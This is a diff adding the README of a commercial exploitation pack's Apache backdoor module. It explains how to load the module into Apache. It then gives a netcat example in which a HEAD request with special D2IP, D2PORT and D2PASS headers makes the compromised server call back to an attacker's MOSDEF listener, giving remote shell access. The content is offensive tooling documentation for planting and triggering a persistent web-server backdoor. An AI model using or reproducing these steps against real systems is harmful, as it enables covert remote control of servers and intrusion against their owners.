@@ -1,0 +1,44 @@
+D2 Exploitation Pack
+
+Copyright (c) 2007-2009 DSquare Security, LLC
+All rights reserved.
+
+License information
+---------------------
+
+
+See the file "LICENSE.txt" for information on the history of this
+software, terms & conditions for usage, and a DISCLAIMER OF ALL
+WARRANTIES.
+
+Description
+-------------
+
+This module is an Apache module backdoor. Once loaded, the module
+will watch for requests where special headers are set. It will look for
+D2IP, D2PORT and D2PASS.
+
+d2sec_modapache_20.so is for Apache 2.0.x
+d2sec_modapache_22.so is for Apache 2.2.x
+
+To enabled this module with Apache configuration :
+
+$ cat d2sec.load
+LoadModule d2sec_module /usr/lib/apache2/modules/mod_d2sec.so
+
+
+Example
+--------
+
+On the first terminal, run a Mosdef listener. On the second terminal you run:
+
+$ nc -v -n 192.168.0.2 80
+(UNKNOWN) [192.168.0.2] 80 (www) open
+HEAD / HTTP/1.1
+D2IP: 192.168.0.1
+D2PORT: 5555
+D2PASS: 4ed1479a7a48653b13d492f52ecbe5d6
+
+HTTP/1.1 200 OK
+
+The local box (192.168.0.1) should now have a mosdef on the Apache box (192.168.0.2).
